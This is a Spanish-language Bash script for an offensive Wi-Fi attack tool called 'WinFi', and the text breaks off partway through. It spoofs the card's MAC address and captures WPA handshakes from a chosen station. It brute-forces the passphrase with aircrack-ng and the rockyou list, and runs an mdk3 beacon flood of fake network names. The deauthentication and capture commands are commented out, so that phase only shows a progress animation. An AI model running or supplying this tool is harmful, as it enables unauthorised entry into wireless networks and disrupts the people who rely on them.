#!/bin/bash

#Colours
gC="\e[0;32m\033[1m"
endC="\033[0m\e[0m"
rC="\e[0;31m\033[1m"
bC="\e[0;34m\033[1m"
yC="\e[0;33m\033[1m"
pC="\e[0;35m\033[1m"
tuC="\e[0;36m\033[1m"
grC="\e[0;37m\033[1m"


#Variables

version=1.0
dicR=files/redes.txt
trap ctrl_c INT

export DEBIAN_FRONTEND=noninteractive

#Funciones
function ctrl_c(){
	if [[ $tm == "i"  ]]; then
		kill -9 $BFPID 2>/dev/null; wait $BFPID 2>/dev/null
		echo -e "\n${rC} [!]${endC}${bC} Ataque Beacon Flood finalizado...${endC}"
		sleep 1
		echo -e "\n${rC} [!] ${endC}${grC}Saliendo ...${endC}"
		sleep 1
		rm int > /dev/null 2>&1; rm "files/handshake*" > /dev/null 2>&1; airmon-ng stop $inter > /dev/null 2>&1; service networking restart; tput cnorm; exit 0
	else
		echo -e "\n\n${rC} [!] ${endC}${gC}Saliendo ...${endC}"
		kill -9 $BFPID 2>/dev/null; wait $BFPID 2>/dev/null; rm int > /dev/null 2>&1; airmon-ng stop $inter > /dev/null 2>&1; rm "files/handshake*" > /dev/null 2>&1;service networking restart; tput cnorm;exit 0
	fi
}

function banner(){
	tput civis
        echo -e "${grC}                                            .ccc:;'.${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                             :::cldOXKx:.${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                             ,,, .   .;xN0:${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                            .oodx0XKd;   :XNc${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                                    c0No.  lM0${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                       ..   'OO0X0o.  'XW;  'WK${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                    ;:KlN.        xMx   KM.  oMo${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                                .'kMO   oM. ;KN0.  dMl  'Xl   o;${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                         ..,. .,  00.  ,WO  ,OKk.  lll${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                     .,OXdod' .  o:   ,WX${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}                   '.  ',.:..k: ;.   xMMxlWM'${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}              .,lOk     .;   .c .   XXo.  oW.${endC}\t${bC}__          ___       ______ _${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}        'c,...'';x:  '  x   .O.    ,'     x.${endC}\t${bC}\ \        / (_)     |  ____(_)${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}       dM     ;'    d.  Ko'ox.          .. ${endC}\t${bC} \ \  /\  / / _ _ __ | |__   _ ${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}        ':.    OWxc'xc  NMN,     .   .lo.${endC}\t${bC}  \ \/  \/ / | | '_ \|  __| | |${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}           .:.,do;.  K0KMW.    .c  .',0${endC}\t\t${bC}   \  /\  /  | | | | | |    | |${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}           :X         dWMX    'X   . .'${endC}\t\t${bC}    \/  \/   |_|_| |_|_|    |_|${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}          dMM,         .oNl    x     .${endC}\t       ${pC}WinFi $version v. --- Desarrollado por ${endC}${rC}Winsad${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}         kMMMW,           'c   ,${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}         oo. .xW.            :${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}       ,      OO            .${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}      .       ld${endC}"
	/usr/bin/sleep .05
        echo -e "${grC}              d${endc}"
	/usr/bin/sleep 1

}


function help(){

	echo -e "\n ${yC}[!]${endC} ${bC}Opciones:${endC} ${grC}$0${endC}"
	echo -e "\t ${bC}a)${endC} ${gC}Modo de Ataque:${endC}"
	echo -e "\t\t${tuC}- Handshake${endC}"
	echo -e "\t\t${tuC}- PKMID${endC}"
	echo -e "\t\t${tuC}- Portal Cautivo${endC}"
	echo -e "\t\t${tuC}- EviTwin${endC}"
	echo -e "\t\t${tuC}- BeconFlood${endC}"
	echo -e "\t ${bC}n)${endC} ${gC}Nombre de la tarjeta de Red.${endC}"
	echo -e "\t\t${tuC}- Ej: -n wlan0${endC}"
	echo -e "\t ${bC}d)${endC} ${gC}Omitir comprobación de las Dependencias.${endC}"
	echo -e "\t ${bC}g)${endC} ${gC}Modo Guia${endC}"
	echo -e "\t\t${tuC}- El modo guia te va guiando paso a paso.${endC}"
	echo -e "\t\t${tuC}- Ej: $0 -g${endC}"
	echo -e "\n ${yC}[*]${endC} ${bC}Ejemplo:${endC} ${grC}$0 -a handshake -n wlan0 ${endC}"

	tput cnorm
}

function dependencias(){
	tput civis;clear; dep=(macchanger airmon-ng airodump-ng mdk3 pyrit); declare -i coun=0; depn=()

	echo -e "\n ${yC}[*] ${endC}${pC}Verificando dependencias.${endC}"
	/usr/bin/sleep 1
	clear
	echo -e "\n ${yC}[*] ${endC}${pC}Verificando dependencias..${endC}"
	/usr/bin/sleep 1
	clear
	echo -e "\n ${yC}[*] ${enC}${pC}Verificando dependencias...${endC}"


	for pro in "${dep[@]}";do
 		echo -en "\n\t${yC} [*]${endC} ${grC}Comprobando programa $pro${endC}"
		sleep .5
	which $pro >/dev/null 2>&1
		if [ "$(echo $?)" == "0" ]; then
			echo -e "${yC} ...... ${endC}${bC}[V]${endC}"
			coun=$coun+1
			/usr/bin/sleep .5

		else
			echo -e "${yC} ...... ${endC}${rC}[X]${endC}"
			depn=($pro "${depn[@]}")
		/usr/bin/sleep .5
		fi
	done

#	echo ${depn[@]}
#	echo $(echo ${dep[*]} | wc -w)
	if [ $coun == $(echo ${dep[*]} | wc -w) ]; then
		clear
	else
		echo -en "${rC}\n [!]${endC}${grC} Desea instalar las dependencias faltantes(${end}${bC}"$(echo ${depn[@]} | tr ' ' ', ')"${endC}${grC})?[y/n] ${endC}" && read r

		if [[ $r == "y" || $r == "Y" || $r == "yes" || $r == "YES" ]]; then

			for i in "${depn[@]}";do
				echo -e "${yC}\n\t [+]${endC} ${grC}Instalando programa${endC} ${bC}$i${endC}"
				if [ $i == pyrit ]; then

					sudo git clone https://github.com/JPaulMora/Pyrit > /dev/null 2>&1
					cd Pyrit; python setup.py install > /dev/null 2>&1
					sudo pip install -U pip scapy==2.4.2 > /dev/null 2>&1
					rm -r Pyriy > /dev/null 2>&1
				else
					sudo apt-get install $i -y --fix-missing > /dev/null 2>&1
				fi
			done
		else
			tput cnorm; exit 0
		fi
fi
}

function monitor(){

	 echo -e "\n${bC} [!]${endC}${gC} Iniciando tarjeta de red ${bC}$networkCard${endC} ${gC}en modo monitor...${endC}"
	#/usr/bin/sleep 1

	airmon-ng start $networkCard > /dev/null 2>&1
	iwconfig > /dev/null 2>&1 > int
	inter=$(cat int | cut -d ' ' -f 1 | xargs | grep "mon$")
	echo -e "\n${bC} [!]${endC}${gC} Cambiando la direccion MAC de la tardejta de red ${bC}$inter${endC}...${endC}"
	amac=$(macchanger -s $inter | grep -i current | xargs | cut -d ' ' -f '3-30')
	ifconfig $inter down && macchanger -a $inter > /dev/null 2>&1
	echo -e "${rC}\t [*]${endC}${tuC} Direccion MAC de la tarjeta de interfaz $inter: $amac${endC}"
	echo -e "${yC}\t [*]${endC}${tuC} Nueva direccion MAC asignada:${endC} ${pC}$(macchanger -s $inter | grep -i current |xargs | cut -d ' ' -f '3-30')${endC}"
	ifconfig $inter up > /dev/null 2>&1; killall wpa_supplicant dhclient 2>/dev/null
	#sleep 5
	clear
#	airmon-ng stop $inter > /dev/null 2>&1
#	ifconfig $networkCard up > /dev/null 2>&1


}

function startA(){

	if [ $(echo $attackMode | tr a-z A-Z) == "HANDSHAKE" ]; then
		echo -e "\n${yC} [*]${endC}${tuC} Iniciando modo de ataque ${grC}$attackMode${endC}"
		/usr/bin/sleep 1

		echo -e "\n${yC} [*]${endC}${grC} Scaneando estaciones ...${endC}"

		#xterm -hold -fg white -bg black -e "airodump-ng $inter" &
		#aPID=$!
		sleep 5
		echo -ne "\n\t${gC} [?]${endC}${bC} Ingresa el nombre de la estacion: ${endC}" && read ssid
	#	echo -e $ssid
		echo -ne "\n\t${gC} [?]${endC}${bC} Ingresa el canal de la estacion ${endC}${grC}$ssid: ${endC}" && read ch
	#	echo -e $ch

		#kill -9 $aPID; wait $aPID 2>/dev/null

		echo -ne "\n\t${gC} [?]${endC}${bC} Ingresa el tiempo en segundos que durara el ataque[def 60]: ${endC}" && read tm
		sleep 4
		clear
		#Comprobar si es un numero entero
		if [[ $tm =~ ^-?[0-9]+$ ]]; then

		#	xterm -hold -fg white -bg black -e "airodump-ng -c $ch -w files/handshake --essid $ssid $inter" &
		#	hPID=$!

		#	xterm -hold -fg white -bg black -e " aireplay-ng -0 tm -e $ssid -c FF:FF:FF:FF:FF:FF $inter" &
		#	dPID=$!
			for i in $(seq 1 $tm); do
			echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake.${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [|]${endC}${grC}Consiguiendo Handshake.${endC}"
				sleep .25
				clear
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake..${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [/]${endC}${grC}Consiguiendo Handshake..${endC}"
				sleep .25
				clear
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake...${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [-]${endC}${grC}Consiguiendo Handshake...${endC}"
				sleep .25
				clear
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake....${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [\]${endC}${grC}Consiguiendo Handshake....${endC}"
				sleep .25
			clear
			done
		#	kill -9 $hPID; wait $hPID 2>/dev/null
		#	kill -9 $dPID; wait $dPID 2>/dev/null

			cat files/handshake-01.cap > /dev/null 2>&1
			fh=$?
##			echo $fh

			if [ $fh == "0" ]; then
##				pyrit -r  files/handshake-01.cap analyze
				if [ $(pyrit -r files/handshake-01.cap analyze | grep "handshake" | tail -1 | awk '{print $5}' | tr -d '() :') == 'handshakes' ]; then
					echo -ne "\n${rC} [!]${endC}${bC} Se encontro un Handshake${endC}"
					echo -ne "\n${yC} [?]${endC}${grC} Desea usar fuerza bruta para romper la password?[Y/n] ${endC}" && read hand
						if [[ $hand == "y" || $hand == "Y" || $hand == "yes" || $hand == "Yes" || $hand == "YES" ]]; then

							echo -ne "\n${yC} [?]${endC}${grC} Cuenta con algun diccionario de password?[Y/n] ${endC}" && read res
								if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
									echo -ne "\n${yC} [?]${endC}${grC} Ingrese el path o nombre del diccionario: ${endC}" && read dic
									ls $dic > /dev/null 2>&1
									statusD=$?
##									echo $dic
									if [ $statusD == "0" ]; then
										xterm -hold -fg white -bg black -e "aircrack-ng -w $dic files/handshake-01.cap" &
										PID=$!
										for i in $(seq 20); do
											clear
											echo -e "\n${yC} [|]${endC}${grC} Iniciando fuerza bruta .${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [/]${endC}${grC} Iniciando fuerza bruta ..${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [-]${endC}${grC} Iniciando fuerza bruta ...${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [\]${endC}${grC} Iniciando fuerza bruta ....${endC}"
											sleep .25
											clear
											ps -u | grep $PID | head -1 | grep 'aircrack-ng' > /dev/null 2>&1
											Stc=$?
											if [ $Stc == "1" ]; then
												echo -e "\n${tuC} [*]${endC}${bC} Fuerza bruta finalizada ..... [✔]${endC}"
												echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
												break
											fi
										done
									else
									# Si no exite el diccionario se setea automatico
										dic=diccionarios/rockyou.txt
										xterm -hold -fg white -bg black -e "aircrack-ng -w $dic files/handshake-01.cap" &
										PID=$!
										for i in $(seq 20); do
											clear
											echo -e "\n${yC} [|]${endC}${grC} Iniciando fuerza bruta .${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [/]${endC}${grC} Iniciando fuerza bruta ..${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [-]${endC}${grC} Iniciando fuerza bruta ...${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [\]${endC}${grC} Iniciando fuerza bruta ....${endC}"
											sleep .25
											clear
											ps -u | grep $PID | head -1 | grep 'aircrack-ng' > /dev/null 2>&1
											Stc=$?
											if [ $Stc == "1" ]; then
												echo -e "\n${tuC} [*]${endC}${bC} Fuerza bruta finalizada ..... [✔]${endC}"
												echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
												break
											fi
									done
									fi
								else
								#Si no cuenta con diccionario se setea el rockyou por defecto
									dic=diccionarios/rockyou.txt
									xterm -hold -fg white -bg black -e "aircrack-ng -w $dic files/handshake-01.cap" &
									PID=$!
									for i in $(seq 20); do
										clear
										echo -e "\n${yC} [|]${endC}${grC} Iniciando fuerza bruta .${endC}"
										sleep .25
										clear
										echo -e "\n${yC} [/]${endC}${grC} Iniciando fuerza bruta ..${endC}"
										sleep .25
										clear
										echo -e "\n${yC} [-]${endC}${grC} Iniciando fuerza bruta ...${endC}"
										sleep .25
										clear
										echo -e "\n${yC} [\]${endC}${grC} Iniciando fuerza bruta ....${endC}"
										sleep .25
										clear
										ps -u | grep $PID | head -1 | grep 'aircrack-ng' > /dev/null 2>&1
										Stc=$?
										if [ $Stc == "1" ]; then
											echo -e "\n${tuC} [*]${endC}${bC} Fuerza bruta finalizada ..... [✔]${endC}"
											echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
											break
										fi
								done
								fi
						else
						#Si el usuario decide que no se sale del programa pero se pregunta si quiere guardar el archivo.
						echo ""
						fi

				else
				#No se encontro un archivo con un handshake
				echo -e "\n${rC} [!]${endC}${grC} No se pudo encontrar un ${endC}${pC}Handshake ${endC}"
				echo -ne "\n${yC} [?]${endC}${grC} Desea repetir el ataque?[Y/n] ${endC}" && read res

				if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
					clear
					startA
				else
					clear
					echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
				rm files/handshake* > /dev/null 2>&1
				fi

				fi
			else
				echo -e "\n${rC} [!]${endC}${grC} No se pudo encontrar un ${endC}${pC}Handshake ${endC}"

				echo -ne "\n${yC} [?]${endC}${grC} Desea repetir el ataque?[Y/n] ${endC}" && read res

				if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
					clear
					startA
				else
					clear
					echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"

				fi
			fi

		else
		#Ataque dura 60 segundos
			tm=60
		#	xterm -hold -fg white -bg black -e "airodump-ng -c $ch -w files/handshake --essid $ssid $inter" &
		#	hPID=$!

		#	xterm -hold -fg white -bg black -e " aireplay-ng -0 tm -e $ssid -c FF:FF:FF:FF:FF:FF $inter" &
		#	dPID=$!
			for i in $(seq 1 $tm); do
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake.${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [|]${endC}${grC}Consiguiendo Handshake.${endC}"
				sleep .25
				clear
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake..${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [/]${endC}${grC}Consiguiendo Handshake..${endC}"
				sleep .25
				clear
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake...${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [-]${endC}${grC}Consiguiendo Handshake...${endC}"
				sleep .25
				clear
				echo -e "\n${rC} [!]${endC}${bC} Iniciando fase de captura de Handshake....${endC}"
				echo -e "${yC} [!]${endC}${grC} Station: ${endC}${bC}$ssid${endC}${grC} ~~ Channel:${endC} ${bC}$ch${endC} ${grC}~~ Time:${endC} ${bC}$tm ${endC}"
				echo -e "${yC}\n\t [\]${endC}${grC}Consiguiendo Handshake....${endC}"
				sleep .25
				clear
			done
		#	kill -9 $hPID; wait $hPID 2>/dev/null
		#	kill -9 $dPID; wait $dPID 2>/dev/null
			cat files/handshake-01.cap > /dev/null 2>&1
			fh=$?
##			echo $fh
			if [ $fh == "0" ]; then
##				pyrit -r  files/handshake-01.cap analyze
				if [ $(pyrit -r files/handshake-01.cap analyze | grep "handshake" | tail -1 | awk '{print $5}' | tr -d '() :') == 'handshakes' ]; then
					echo -ne "\n${rC} [!]${endC}${bC} Se encontro un Handshake${endC}"
					echo -ne "\n${yC} [?]${endC}${grC} Desea usar fuerza bruta para romper la password?[Y/n] ${endC}" && read hand
						if [[ $hand == "y" || $hand == "Y" || $hand == "yes" || $hand == "Yes" || $hand == "YES" ]]; then
							echo -ne "\n${yC} [?]${endC}${grC} Cuenta con algun diccionario de password?[Y/n] ${endC}" && read res
								if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
									echo -ne "\n${yC} [?]${endC}${grC} Ingrese el path o nombre del diccionario: ${endC}" && read dic
									ls $dic > /dev/null 2>&1
									statusD=$?
##									echo $dic
									if [ $statusD == "0" ]; then
										xterm -hold -fg white -bg black -e "aircrack-ng -w $dic files/handshake-01.cap" &
										PID=$!
										for i in $(seq 20); do
											clear
											echo -e "\n${yC} [|]${endC}${grC} Iniciando fuerza bruta .${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [/]${endC}${grC} Iniciando fuerza bruta ..${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [-]${endC}${grC} Iniciando fuerza bruta ...${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [\]${endC}${grC} Iniciando fuerza bruta ....${endC}"
											sleep .25
											clear
											ps -u | grep $PID | head -1 | grep 'aircrack-ng' > /dev/null 2>&1
											Stc=$?
											#verificacion de que el proceso sigue en pie
											if [ $Stc == "1" ]; then
												echo -e "\n${tuC} [*]${endC}${bC} Fuerza bruta finalizada ..... [✔]${endC}"
												echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
												break
											fi
										done
									else
									# Si no exite el diccionario se setea automatico
										dic=diccionarios/rockyou.txt
										xterm -hold -fg white -bg black -e "aircrack-ng -w $dic files/handshake-01.cap" &
										PID=$!
										for i in $(seq 20); do
											clear
											echo -e "\n${yC} [|]${endC}${grC} Iniciando fuerza bruta .${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [/]${endC}${grC} Iniciando fuerza bruta ..${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [-]${endC}${grC} Iniciando fuerza bruta ...${endC}"
											sleep .25
											clear
											echo -e "\n${yC} [\]${endC}${grC} Iniciando fuerza bruta ....${endC}"
											sleep .25
											clear
											ps -u | grep $PID | head -1 | grep 'aircrack-ng' > /dev/null 2>&1
											Stc=$?
											#verificacion de que el proceso sigue en pie
											if [ $Stc == "1" ]; then
												echo -e "\n${tuC} [*]${endC}${bC} Fuerza bruta finalizada ..... [✔]${endC}"
												echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
												break
											fi
										done
									fi
								else
								#Si no cuenta con diccionario se setea el rockyou por defecto
									dic=diccionarios/rockyou.txt
									xterm -hold -fg white -bg black -e "aircrack-ng -w $dic files/handshake-01.cap" &
									PID=$!
									for i in $(seq 20); do
										clear
										echo -e "\n${yC} [|]${endC}${grC} Iniciando fuerza bruta .${endC}"
										sleep .25
										clear
										echo -e "\n${yC} [/]${endC}${grC} Iniciando fuerza bruta ..${endC}"
										sleep .25
										clear
										echo -e "\n${yC} [-]${endC}${grC} Iniciando fuerza bruta ...${endC}"
										sleep .25
										clear
										echo -e "\n${yC} [\]${endC}${grC} Iniciando fuerza bruta ....${endC}"
										sleep .25
										clear
										ps -u | grep $PID | head -1 | grep 'aircrack-ng' > /dev/null 2>&1
										Stc=$?
										#verificacion de que el proceso sigue en pie
										if [ $Stc == "1" ]; then
											echo -e "\n${tuC} [*]${endC}${bC} Fuerza bruta finalizada ..... [✔]${endC}"
											echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
											break
										fi
									done
								fi
						else
						#Si el usuario decide que no se sale del programa pero se pregunta si quiere guardar el archivo (se cambia el nombre).
						echo -ne "\n${yC} [?]${endC}${bC} Desea guardar el archivo .cap?[Y/n] ${endC}" && read res
							if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
								echo -ne "\n${yC} [?]${endC}${bC} Con que nombre desea guardarlo? ${endC}" && read name
								mv files/handshake-01.cap files7name.cap > /dev/null 2>&1
								echo -e "\n ${rC}[!]${endC}${grC} Saliendo ...${endC}"
							else
								echo -e "\n ${rC}[!]${endC}${grC} Saliendo ...${endC}"
							fi
						fi

				else
				#No se encontro un archivo con un handshake
				echo -e "\n${rC} [!]${endC}${grC} No se pudo encontrar un ${endC}${pC}Handshake ${endC}"
				echo -ne "\n${yC} [?]${endC}${grC} Desea repetir el ataque?[Y/n] ${endC}" && read res

				if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
					clear
					startA
				else
					clear
					echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
				rm files/handshake* > /dev/null 2>&1
				fi
			fi
			else
				echo -e "\n${rC} [!]${endC}${grC} No se pudo encontrar un ${endC}${pC}Handshake ${endC}"

				echo -ne "\n${yC} [?]${endC}${grC} Desea repetir el ataque?[Y/n] ${endC}" && read res

				if [[ $res == "y" || $res == "Y" || $res == "yes" || $res == "Yes" || $res == "YES" ]]; then
					clear
					startA
				else
					clear
					echo -e "\n${yC} [!]${endC}${grC} Saliendo ...${endC}"
				fi
			fi
		fi
		
	elif [ $(echo $attackMode | tr a-z A-Z) == "BECONFLOOD" ]; then
		clear
		echo -e "\n${yC} [*]${endC}${bC} Iniciando modo de ataque $attackMode .${endC}"
		sleep .5
		clear
		echo -e "\n${yC} [*]${endC}${bC} Iniciando modo de ataque $attackMode ..${endC}"
		sleep .5
		clear
		echo -e "\n${yC} [*]${endC}${bC} Iniciando modo de ataque $attackMode ...${endC}"
		echo -ne "\n${bC} [?]${endC}${grC} Desea utilizar un archivo pre-configurado?[Y/n] ${endC}" && read resp

		if [[ $resp == "y" || $resp == "Y" || $resp == "yes" || $resp == "Yes" || $resp == "YES" ]]; then

			echo -ne "\n${yC} [*]${endC}${grC} Ingrese el nombre o ruta del archivo: ${endC}" && read file

			#verificar que exite el archivo
			cat $file > /dev/null 2>&1
			status=$?
			if [[ $status == 0 ]]; then
				#verificar que tiene contenido
				if [ $(wc -l $file | cut -d ' ' -f 1) -ne 0 ]; then
					#Verificar que el archivo no tenga lineas con mas de 31 caracteres
					Vfile=($(cat $file)) > /dev/null 2>&1
					num=0
					for i in "${Vfile[@]}"; do
						num=$((num+1))
						if [[ $(echo $i | wc -m) -le 32 ]]; then
							true
						else
							echo -e "\n ${rC}[!]${endC}${gC} El archivo $file contiene en la linea $num una string mayor a 31 bytes${endC}"
							echo -e "\t${rC} [*]${endC}${grC}String: ${endC}${bC}$i${endC}"
							file=files/redes.txt
							echo -e "\t${rC} [!]${endC}${tuC} Se configuro un diccionario por defecto: $file${endC}"
							sleep 2
						fi
					done

					echo -ne "\n${yC} [*]${endC}${grC} Ingrese el canal en que operara el ataque[0-14]: ${endC}" && read ch
					if [[ $ch =~ ^-?[0-9]+$ ]]; then
						#validar que este entre 0 y 14
						if (($ch >= 0 && $ch <= 14)); then
							true
						else
						#setear un valor en dado caso que se salga de los canales existentes
							echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
							ch=1
							echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
							sleep 2
						fi
					else
					#setear un valor en dado caso que se salga de los canales existentes
						echo -e "\n\t ${rC} [!]${endC}${tuC} $ch no es un numero valido.${endC}"
						ch=1
						echo -e "\n\t ${rC} [!]${endC}${tuC} Se configuro en el canal 1.${endC}"
						sleep 2
					fi
					echo -ne "\n${yC} [*]${endC}${grC} Ingrese el tiempo que durara el ataque[i=indefinido]: ${endC}" && read tm

					if [[ $tm =~ ^-?[0-9]+$ ]]; then

						echo -e " ${yC}\n [*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						mdk3 $inter b -f $file -a -s 1000 &
						BFPID=$!
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
						bi=0
						mapfile -t redes < $file
						for i in $(seq $tm); do
								clear
								echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
								sleep .25
								clear
								echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$bi]}${endC}"
								sleep .25
								bi=$((bi+1))
								if [[ $bi == $linesF ]]; then
									bi=0
								fi
						done
						kill -9 $BFPID; wait $BFPID 2>/dev/null
						echo -e "\n${rC} [!]${endC}${bC} Ataque Beacon Flood finalizado...${endC}"
						sleep 1
						echo -e "\n${rC} [!] ${endC}${grC}Saliendo ....${endC}"
						sleep 1
						exit 0

					elif [ $tm == 'i' ]; then
						echo -e " ${yC}[*] ${endC}${bC}Iniciando ataque Beacon Flood ...${endC}"
						mdk3 $inter b -f $file -a -s 1000 &
						BFPID=$!
						mapfile -t redes < $file
						linesF=$(cat $file | wc -l) > /dev/null 2>&1
						i=0
						while true; do
							clear
							echo -e "\n${yC} [\]${endC}${grC} Ataque Beacon FLood en progreso . ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [|]${endC}${grC} Ataque Beacon FLood en progreso .. ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [/]${endC}${grC} Ataque Beacon FLood en progreso ... ${endC}\n\n ${rC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							clear
							echo -e "\n${yC} [-]${endC}${grC} Ataque Beacon FLood en progreso .... ${endC}\n\n ${bC}[*]${endC}${tuC} Redes punblicadas:${endC} ${yC}${redes[$i]}${endC}"
							sleep .25
							i=$((i+1))
							if [[ $i == $linesF ]]; then
								i=0
							fi
						done
					else
					#alerta de que no es valido el tiempo y conteo para iniciar el ataque en tiempo infefinido
						for i in $(seq 6); do
							clear
							echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida .${endC}"
							echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido .${endC}"
							echo -e "\n ${bC} [-]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${bC} [!] $tm${endC}${grC} Opcion invalida ..${endC}"
							echo -e "\n ${rC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ..${endC}"
							echo -e "\n ${yC} [/]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${yC} [!] $tm${endC}${grC} Opcion invalida ...${endC}"
							echo -e "\n ${bC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ...${endC}"
							echo -e "\n ${rC} [|]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
							clear
							echo -e "\n ${rC} [!] $tm${endC}${grC} Opcion invalida ....${endC}"
							echo -e "\n ${yC} [¡]${endC}${grC} Se seteara el modo de ataque con un tiempo indefinido ....${endC}"
							echo -e "\n ${bC} [\]${endC}${grC} Iniciando en: $i seg.${endC}"
							sleep .25
						done
						tm=i
